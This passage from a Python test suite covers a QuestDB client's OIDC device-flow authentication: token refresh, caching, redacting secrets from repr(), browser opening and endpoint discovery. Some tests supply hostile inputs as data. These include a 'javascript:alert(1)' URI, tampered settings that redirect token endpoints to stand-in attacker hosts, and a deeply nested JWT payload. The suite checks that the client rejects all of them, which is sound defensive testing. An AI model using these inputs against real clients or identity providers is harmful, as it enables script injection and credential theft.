        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_nan_device_timing_fields_do_not_crash(self):
        # NaN interval / expires_in in the device-auth response: int(nan) raises
        # ValueError, not the OverflowError that inf raises above — a different
        # except arm. Must be treated as unknown, not crash. Review m6.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': float('nan'), 'interval': float('nan')}
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_deeply_nested_jwt_payload_does_not_crash(self):
        # A hostile/buggy IdP returning an id_token whose payload base64-decodes
        # to deeply-nested JSON must not crash token() with a raw RecursionError
        # from the best-effort identity decode (RecursionError is not a
        # ValueError); the decode degrades to no-identity and the token is still
        # returned. See _decode_jwt_claims.
        payload = base64.urlsafe_b64encode(
            (('[' * 60000) + (']' * 60000)).encode()).rstrip(b'=').decode()
        nested = f'aaa.{payload}.sig'
        self.state.token_script = [(200, {
            'id_token': nested, 'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), nested)

    def test_non_string_token_fields_do_not_crash(self):
        # A buggy/hostile IdP returning a non-string access_token / id_token (a
        # JSON number/bool/object) must not crash token() with a raw
        # AttributeError from the best-effort JWT decode, nor be stored and
        # emitted as ``Bearer <non-str>``. The non-string token reads as absent,
        # so the grant fails with the clear terminal error and nothing is
        # cached. See M2.
        self.state.token_script = [(200, {
            'access_token': 12345, 'id_token': {'not': 'a-jwt'},
            'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth()  # groups_in_token=False -> needs access_token
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_tokenset_from_response_coerces_non_string_credentials(self):
        # _tokenset_from_response coerces every non-string credential field to
        # None (treated as absent), and _decode_jwt_claims is total on any
        # non-string input. See M2.
        from questdb.auth._device import _decode_jwt_claims
        auth = self.make_auth()
        ts = auth._tokenset_from_response({
            'access_token': 123, 'id_token': True,
            'refresh_token': ['x'], 'expires_in': 3600})
        self.assertIsNone(ts.access_token)
        self.assertIsNone(ts.id_token)
        self.assertIsNone(ts.refresh_token)
        # token_type / scope are coerced too: a non-string falls back to the
        # default ('Bearer' / the configured scope) instead of landing raw in
        # the frozen dataclass; a valid string passes through unchanged.
        ts_bad = auth._tokenset_from_response({
            'access_token': ACCESS_TOKEN, 'token_type': ['x'],
            'scope': 123, 'expires_in': 3600})
        self.assertEqual(ts_bad.token_type, 'Bearer')
        self.assertEqual(ts_bad.scope, auth.config.scope)
        ts_ok = auth._tokenset_from_response({
            'access_token': ACCESS_TOKEN, 'token_type': 'DPoP',
            'scope': 'openid email', 'expires_in': 3600})
        self.assertEqual(ts_ok.token_type, 'DPoP')
        self.assertEqual(ts_ok.scope, 'openid email')
        for bad in (123, 1.5, True, {'a': 1}, [1, 2], None, ''):
            self.assertEqual(_decode_jwt_claims(bad), {})

    def test_idp_requests_use_configured_timeout(self):
        # The device-code / poll / refresh POSTs must use the configured
        # timeout, so a stalled IdP can't pin the acquisition lock for the
        # urllib default (30s) per network leg. See M3.
        seen = []

        def fake_post_form(url, form, *, ctx=None, insecure=False,
                           timeout=None):
            seen.append(timeout)
            if url.endswith('/device'):
                return 200, {'device_code': 'D', 'user_code': 'U',
                             'verification_uri': 'https://idp/d',
                             'expires_in': 600, 'interval': 5}
            return 200, {'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
                         'token_type': 'Bearer', 'expires_in': 3600}

        from questdb.auth import _device
        auth = self.make_auth(timeout=3)
        with mock.patch.object(_device, 'post_form', fake_post_form):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(seen)
        self.assertTrue(
            all(t == 3 for t in seen),
            f'IdP POSTs did not all use the configured timeout: {seen}')

    def test_from_questdb_defers_signin(self):
        # from_questdb() must return WITHOUT running the device flow; the first
        # token-needing call then triggers exactly one sign-in.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, renderer=Renderer(),
            interactive=True, _clock=FakeClock())
        self.assertEqual(self.state.device_requests, 0)  # deferred
        self.assertEqual(auth.token(), ID_TOKEN)          # first use signs in
        self.assertEqual(self.state.device_requests, 1)

    def test_open_browser_rejects_dangerous_scheme(self):
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open') as opener:
            auth._maybe_open_browser({'verification_uri': 'javascript:alert(1)'})
            opener.assert_not_called()
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            opener.assert_called_once_with('https://idp.example.com/device')

    def test_open_browser_default_is_true(self):
        # We try to open the browser by default ("always when possible"), via
        # both the explicit constructor and discovery.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            insecure=True, renderer=Renderer(), _clock=FakeClock())
        self.assertTrue(auth.open_browser)
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        disc = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, renderer=Renderer(), _clock=FakeClock())
        self.assertTrue(disc.open_browser)

    def test_signin_opens_browser_by_default(self):
        # On a (non-kernel) terminal, signing in opens the verification URL with
        # no opt-in — make_auth() leaves open_browser at its default.
        auth = self.make_auth()
        auth.token()
        self.mock_browser_open.assert_called_once_with(
            'https://idp.example.com/device?user_code=WDJB-MJHT')

    def test_open_browser_suppressed_in_notebook_kernel(self):
        # Never open on a (possibly remote) notebook kernel, even when enabled:
        # the kernel host is not the user's machine.
        auth = self.make_auth(open_browser=True)
        with mock.patch('questdb.auth._device.in_ipython_kernel',
                        return_value=True):
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
        self.mock_browser_open.assert_not_called()

    def test_maybe_open_browser_swallows_open_error(self):
        # webbrowser.open raising (no browser / a bad $BROWSER) must not break
        # sign-in: opening is best-effort, the prompt is already shown.
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open', side_effect=RuntimeError('boom')):
            auth._maybe_open_browser(  # must not raise
                {'verification_uri': 'https://idp.example.com/device'})

    def test_identity_from_claims_precedence(self):
        # The sign-in success message picks an identity in a fixed precedence:
        # email > preferred_username > upn > name > sub.
        from questdb.auth._device import _identity_from_claims
        self.assertEqual(_identity_from_claims({
            'email': 'a@x', 'preferred_username': 'pu', 'upn': 'u',
            'name': 'N', 'sub': 's'}), 'a@x')
        self.assertEqual(_identity_from_claims({
            'preferred_username': 'pu', 'upn': 'u', 'name': 'N',
            'sub': 's'}), 'pu')
        self.assertEqual(_identity_from_claims({'upn': 'u', 'sub': 's'}), 'u')
        self.assertEqual(_identity_from_claims({'name': 'N', 'sub': 's'}), 'N')
        self.assertEqual(_identity_from_claims({'sub': 's'}), 's')
        self.assertEqual(_identity_from_claims({'sub': 123}), '123')  # stringified
        self.assertIsNone(_identity_from_claims({}))
        self.assertIsNone(_identity_from_claims({'email': ''}))  # empty skipped

    def test_memory_cache_returns_independent_copy(self):
        cache = MemoryCache()
        stored = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        cache.store('k', stored)
        # Each load is a distinct copy — never the object handed to store(), nor
        # shared between loads — so a cached entry can't be aliased and reused.
        first = cache.load('k')
        second = cache.load('k')
        self.assertIsNot(first, stored)
        self.assertIsNot(first, second)
        self.assertEqual(first.refresh_token, 'r')

    def test_tokenset_is_frozen(self):
        # TokenSet is immutable: the lock-free fast path reads a published
        # TokenSet without a lock, which is only safe if its fields never change
        # after construction. Mutating one must raise, not silently succeed.
        import dataclasses
        t = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            t.refresh_token = 'MUTATED'
        # Deriving a modified copy is the supported idiom.
        t2 = dataclasses.replace(t, refresh_token='r2')
        self.assertEqual(t.refresh_token, 'r')
        self.assertEqual(t2.refresh_token, 'r2')

    def test_tokenset_repr_redacts_secrets(self):
        # The access/id/refresh tokens must never appear in repr() — a TokenSet
        # landing in a log line or traceback would otherwise leak credentials.
        # The JWT subject (PII) is redacted too; non-secret metadata stays.
        r = repr(TokenSet(access_token='SECRET-A', id_token='SECRET-I',
                          refresh_token='SECRET-R', sub='subject-PII-12345',
                          scope='openid'))
        self.assertNotIn('SECRET-A', r)
        self.assertNotIn('SECRET-I', r)
        self.assertNotIn('SECRET-R', r)
        self.assertNotIn('subject-PII-12345', r)
        self.assertIn('openid', r)  # non-secret metadata still shown


class TestNonInteractive(AuthTestBase):
    def test_non_interactive_raises_without_polling(self):
        auth = self.make_auth(interactive=False)
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)


class TestRefresh(AuthTestBase):
    def _seed_expired(self, auth, refresh_token='REFRESH-1'):
        expired = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token=refresh_token,
            expires_at=self._clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

    def test_silent_refresh(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_skew_window_triggers_proactive_refresh(self):
        # The point of the cache+skew design: a token still within its lifetime
        # but inside the 30s clock-skew margin is refreshed PROACTIVELY (silently
        # via the refresh_token) so a fresh connection never races a mid-flight
        # 401 — and with no device prompt. Every other refresh test seeds a
        # fully-expired token (valid even at skew=0); this is the only end-to-end
        # exercise of the skew window itself. See M4.
        auth = self.make_auth()
        now = self._clock.now()
        seeded = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token='REFRESH-1',
            issued_at=now - 50,    # 65s lifetime, so the adaptive cap
            expires_at=now + 15)   # (lifetime/2) doesn't bite -> full 30s skew
        # Not actually expired (still valid at skew=0), but inside the real skew.
        self.assertTrue(seeded.is_valid(now, skew=0))
        self.assertFalse(seeded.is_valid(now))
        self.assertLess(now, seeded.expires_at)
        auth._cache.store(auth.cache_key, seeded)

        token = auth.token()

        self.assertEqual(token, ID_TOKEN)                 # groups mode -> id_token
        self.assertEqual(self.state.refresh_requests, 1)  # refreshed once...
        self.assertEqual(self.state.device_requests, 0)   # ...with NO prompt
        self.assertEqual(
            self.state.refresh_forms[0]['refresh_token'], 'REFRESH-1')
        # The refreshed token is cached: a second call neither refreshes nor
        # prompts (it is now far from expiry).
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_failure_falls_back_to_device_flow(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': 'invalid_grant'})
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # re-prompted

    def test_non_string_refresh_error_falls_back_not_crashes(self):
        # M1 (end-to-end): a refresh rejected with a NON-STRING error must still
        # fall back to a fresh device flow, not crash. The terminal
        # OidcDeviceFlowError _refresh raises is caught by _acquire's
        # 'except OidcError'; before the fix a raw TypeError raised DURING that
        # exception's construction slipped past the handler and aborted token().
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': {'obj': 'denied'}})
        token = auth.token()                              # must not raise
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)   # fell back to sign-in

    def test_refresh_token_preserved_when_not_rotated(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 3600})  # no new refresh
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_rotated_refresh_token_is_stored(self):
        # When the IdP DOES rotate the refresh token, the new one must replace
        # the old in the cached token set — else an IdP with one-time-use
        # refresh tokens breaks on the NEXT refresh.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2',  # rotated
            'token_type': 'Bearer', 'expires_in': 3600})
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-2')
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_refresh_without_id_token_falls_back_to_device_flow(self):
        # groups_in_token=True but the IdP's refresh omits the id_token: the
        # refresh is unusable, so fall back to the interactive flow rather than
        # caching it and looping (the device flow yields a complete token).
        auth = self.make_auth(groups_in_token=True)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)            # from the device flow
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # fell back

    def test_refresh_without_id_token_non_interactive_does_not_loop(self):
        # Same situation but non-interactive: surface a clear error rather than
        # repeatedly re-running a refresh that can never satisfy _select. The
        # doomed refresh_token must be evicted on the first failure so a later
        # call goes straight to the (failing) device flow instead of re-issuing
        # the same fruitless refresh on every token() call. Calling token()
        # several times must therefore not climb the refresh count.
        auth = self.make_auth(groups_in_token=True, interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        for _ in range(3):
            with self.assertRaises(OidcInteractionRequired):
                auth.token()
        # Exactly one refresh across all three calls (without the eviction the
        # stale token would be reloaded and re-refreshed every call).
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_cached_token_missing_required_kind_is_refreshed(self):
        # A cached, non-expired token that lacks the required kind (here:
        # access_token in non-groups mode) must not pass the cache gate and
        # then hard-fail in _select; it should trigger a refresh instead.
        auth = self.make_auth(groups_in_token=False)
        auth._cache.store(auth.cache_key, TokenSet(
            access_token=None, id_token='id', refresh_token='REFRESH-1',
            expires_at=self._clock.now() + 3600))
        token = auth.token()
        self.assertEqual(token, ACCESS_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_network_error_propagates_without_reprompt(self):
        # Both endpoints point at a closed port (same origin, so the co-location
        # check passes), so the refresh POST fails at the transport layer. The
        # error must propagate from the *token* endpoint (the refresh), proving
        # the flow did NOT fall back to the device flow on a transient blip.
        clock = FakeClock()
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://127.0.0.1:1/device',
            token_endpoint='http://127.0.0.1:1/token',  # connection refused
            scope='openid groups', groups_in_token=True,
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=clock)
        expired = TokenSet(
            access_token='old', id_token='old-id', refresh_token='REFRESH-1',
            expires_at=clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

        with self.assertRaises(OidcNetworkError) as cm:
            auth.token()
        # The error is from the refresh (token endpoint), not a device-flow
        # fallback (device endpoint), and the refresh token is kept for a retry.
        self.assertIn('/token', str(cm.exception))
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_transient_5xx_kept_for_retry(self):
        # A transient IdP error (5xx) during a silent refresh must NOT tear the
        # session down and re-prompt: the refresh token is still valid, so it is
        # surfaced as a retryable OidcNetworkError and the cached token (with its
        # refresh token) is kept for a later retry — matching the poll loop,
        # which also treats 5xx/429 as transient. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)   # NOT re-prompted
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')  # kept

    def test_refresh_transient_429_kept_for_retry(self):
        # Same as the 5xx case for a 429 rate-limit. M2.
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (429, {'error': 'slow_down'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_includes_audience_when_configured(self):
        # The audience is re-sent on refresh (mirroring the device-auth
        # request), so an IdP that scopes `aud` per request keeps it on the
        # rotated token instead of minting one QuestDB rejects after a silent
        # refresh. When no audience is configured the param is omitted.
        auth = self.make_auth(audience='questdb-api')
        self._seed_expired(auth)
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(
            self.state.refresh_forms[-1].get('audience'), 'questdb-api')

        # Without an audience, the refresh form carries no audience key.
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        self.state.refresh_forms.clear()
        auth2 = self.make_auth()  # no audience
        self._seed_expired(auth2)
        auth2.token()
        self.assertNotIn('audience', self.state.refresh_forms[-1])

    def test_empty_audience_normalized_and_not_sent_on_refresh(self):
        # An empty-string audience is normalized to None in __init__, so it is
        # omitted on refresh too (it was previously sent as `audience=` on
        # refresh only, never on device-auth).
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        auth = self.make_auth(audience='')
        self.assertIsNone(auth.config.audience)
        self._seed_expired(auth)
        auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertNotIn('audience', self.state.refresh_forms[-1])

    def test_refresh_transient_5xx_non_interactive_does_not_hard_fail(self):
        # The worst case: in a non-interactive context (papermill / cron / CI) a
        # transient refresh error must surface as a retryable OidcNetworkError,
        # NOT escalate to OidcInteractionRequired — which a fall-through to the
        # device flow would raise, hard-failing a session whose refresh token is
        # still valid and would succeed on the next attempt. M2.
        auth = self.make_auth(interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (503, {'error': 'temporarily_unavailable'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_non_json_5xx_kept_for_retry(self):
        # A NON-JSON 5xx during a silent refresh (an HTML error page from a proxy
        # in front of the token endpoint) makes post_form RAISE OidcError(status=)
        # rather than return a JSON body — exercising _refresh's `except OidcError`
        # transient arm, distinct from the status-based arm a JSON 5xx hits (the
        # poll loop has the analogous non-JSON coverage; the refresh path did not).
        # It must surface as a retryable OidcNetworkError with the refresh token
        # kept, NOT re-prompt. M2.
        from questdb.auth._device import REFRESH_GRANT
        auth = self.make_auth()
        self._seed_expired(auth)
        real_idp_post = auth._idp_post

        def flaky(url, form):
            if form.get('grant_type') == REFRESH_GRANT:
                raise OidcError('proxy <html>503</html>', status=503)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)            # NOT re-prompted
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')  # kept

    def test_refresh_non_json_4xx_falls_back_to_device_flow(self):
        # A NON-JSON 4xx during a silent refresh (an HTML/plain rejection from a
        # WAF/proxy) is terminal, not transient: post_form RAISES OidcError(status=)
        # and _refresh's `except OidcError` non-transient arm re-raises, so
        # _acquire falls through to a fresh interactive sign-in rather than keeping
        # the rejected refresh token. The device-code POST and the subsequent poll
        # go through the real (JSON) mock IdP, so the flow completes. M2.
        from questdb.auth._device import REFRESH_GRANT
        auth = self.make_auth()
        self._seed_expired(auth)
        real_idp_post = auth._idp_post

        def flaky(url, form):
            if form.get('grant_type') == REFRESH_GRANT:
                raise OidcError('proxy <html>forbidden</html>', status=403)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)                 # from the device flow
        self.assertEqual(self.state.device_requests, 1)   # fell back / re-prompted


class TestDiscovery(AuthTestBase):
    def test_from_questdb_reads_settings(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.client_id, 'questdb')
        self.assertTrue(auth.config.groups_in_token)
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_groups_mode_defaults_to_access_token_when_unset(self):
        # /settings omits acl.oidc.groups.encoded.in.token: the helper mirrors
        # the QuestDB server default (groups NOT encoded in the token) and sends
        # the access_token rather than the id_token.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertFalse(auth.config.groups_in_token)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_settings_path_only_endpoints_not_assembled(self):
        # We do NOT assemble endpoint URLs from acl.oidc.host / port /
        # tls.enabled (matching the Java client). A path-only endpoint reads as
        # absent, so with no issuer to drive .well-known discovery, from_questdb
        # fails with a clear OidcConfigError instead of building a URL from the
        # host/port/tls building blocks.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.host': 'idp.example.com',
            'acl.oidc.port': 443,
            'acl.oidc.tls.enabled': True,
            'acl.oidc.token.endpoint': '/oauth/token',
            'acl.oidc.device.authorization.endpoint': '/oauth/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, insecure=True, renderer=Renderer())

    def test_user_writable_preferences_cannot_override_config(self):
        # A user-writable "preferences" sibling in /settings must never override
        # the trusted "config" object during discovery: end-to-end, the resolved
        # credential endpoints come from "config", not the attacker's prefs.
        self.state.settings = {
            'config': {
                'acl.oidc.enabled': True,
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.scope': 'openid groups',
                'acl.oidc.groups.encoded.in.token': True,
                'acl.oidc.token.endpoint': self.base + '/token',
                'acl.oidc.device.authorization.endpoint': self.base + '/device',
            },
            'preferences.version': 1,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token',
                'acl.oidc.device.authorization.endpoint':
                    'https://evil.example.com/device',
            },
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.token_endpoint, self.base + '/token')
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_well_known_fallback_for_device_endpoint(self):
        # Settings advertise OIDC + token endpoint but NOT the device endpoint;
        # issuer= is pinned, so the IdP .well-known fallback is allowed.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.groups.encoded.in.token': False,
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                           insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_device_fallback_without_issuer_is_rejected(self):
        # M4: QuestDB advertises the token endpoint but not the device
        # endpoint, and no issuer is pinned. Discovery would otherwise be
        # steered by the (possibly tampered) /settings response, so refuse and
        # demand an out-of-band issuer pin — even though a usable .well-known
        # is reachable here, it must NOT be fetched.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_oidc_disabled_raises(self):
        self.state.settings = {'config': {'acl.oidc.enabled': False}}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_missing_device_endpoint_raises(self):
        # issuer= is pinned (so the fallback is allowed), but the IdP's
        # discovery doc carries no device_authorization_endpoint: that is the
        # error under test, not the missing-issuer guard above.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {'issuer': self.base,
                                 'token_endpoint': self.base + '/token'}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_non_dict_well_known_doc_raises_config_error(self):
        # M2: an IdP discovery document that is valid JSON but not an object
        # (a list/null/number/string from a captive portal, a misconfigured
        # proxy, or a hostile IdP) must surface as a typed OidcConfigError, not
        # a raw AttributeError from doc.get(...). issuer= is pinned so the
        # fallback is allowed; the doc's shape is the error under test.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = []  # valid JSON, but not an object
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_malformed_endpoint_port_raises_config_error(self):
        # /settings advertising a non-integer port in an endpoint must raise
        # OidcConfigError (the typed contract), not a bare ValueError that
        # callers catching OidcError would miss. See M6.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp:notaport/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp:notaport/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_endpoint_origin_mismatch_rejected(self):
        # /settings advertises the device endpoint on a different origin than
        # the token endpoint: refuse rather than POST credentials off-origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint':
                'http://127.0.0.2:9/device',  # different host:port
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_issuer_pin_rejects_off_origin_endpoints(self):
        # Endpoints are internally consistent, but an explicit issuer pins them
        # to a different origin -> reject (a compromised /settings can't
        # redirect the token POST when the IdP is pinned).
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, issuer='https://idp.attacker.example',
                insecure=True)

    def test_issuer_pin_accepts_matching_origin(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_settings_endpoint_off_issuer_origin_confirmed_by_discovery(self):
        # Google-style IdP: /settings advertises the token endpoint on a
        # DIFFERENT origin than the pinned issuer, and the device endpoint is
        # discovered. The IdP's own .well-known (fetched from the pinned issuer)
        # advertises the SAME off-origin token endpoint, which authoritatively
        # confirms it — so it is accepted despite not being on the issuer origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://oauth2.idp.example/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': 'https://oauth2.idp.example/token',
            'device_authorization_endpoint':
                'https://oauth2.idp.example/device',
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.token_endpoint,
                         'https://oauth2.idp.example/token')
        self.assertEqual(auth.config.device_authorization_endpoint,
                         'https://oauth2.idp.example/device')

    def test_settings_off_origin_token_not_confirmed_by_discovery_rejected(self):
        # The flip side of the confirmed case: /settings advertises an
        # off-issuer-origin token endpoint that the IdP discovery document does
        # NOT match (a tampered redirect). It is rejected — the device endpoint
        # is discovered on the SAME (attacker) origin only so co-location passes
        # and the issuer-origin pin is what does the rejecting.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://attacker.example/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
